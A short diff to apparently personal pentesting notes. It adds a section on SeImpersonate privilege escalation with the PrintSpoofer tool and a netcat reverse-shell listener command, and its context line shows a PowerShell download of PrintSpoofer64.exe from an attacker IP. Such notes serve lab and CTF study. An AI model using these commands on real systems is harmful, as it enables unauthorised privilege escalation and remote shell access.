@@ -1612,49 +1612,22 @@ iwr http://10.8.36.31:8002/PrintSpoofer64.exe -Outfile C:\Users\Bob\Desktop\Prin
 
 ---------------
 
+### SEIMPERSONATE privilege exploitation with printspoofer
 
+--------------
 
+- Exploit [link](https://github.com/itm4n/PrintSpoofer)-:
 
+![image](https://github.com/user-attachments/assets/b395626c-692b-4164-8d29-5a96b42d3795)
 
+-----------------
 
+### Interactive shell with rlwrap
 
+-----------------
 
+- Use `sudo rlwrap -cAr nc -nlvp 1337`
 
+![image](https://github.com/user-attachments/assets/eeeb1cc2-71ed-420e-9386-9007deaf600b)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
+------------------
